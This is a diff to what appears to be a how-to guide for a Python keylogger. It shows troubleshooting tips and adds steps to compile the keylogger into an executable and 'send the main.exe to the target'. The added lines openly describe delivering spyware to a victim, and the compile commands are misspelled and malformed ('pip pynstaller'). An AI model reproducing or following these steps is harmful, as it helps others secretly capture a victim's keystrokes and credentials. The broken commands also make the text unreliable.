@@ -33,3 +33,12 @@ Permissions Issue:
 "If you get ‘Access is denied,’ right-click CMD, choose ‘Run as administrator,’ and retry."
 Stopping the Keylogger:
 "To stop the keylogger, press Esc (if it works) or use Task Manager to end the python.exe process."
+
+Last but not least here is how you will compile the file
+## step 1
+pip pynstaller
+pynstaller main.py --onefile
+cd dist 
+dir or ls to list files 
+main.exe 
+## send the main.exe to the target
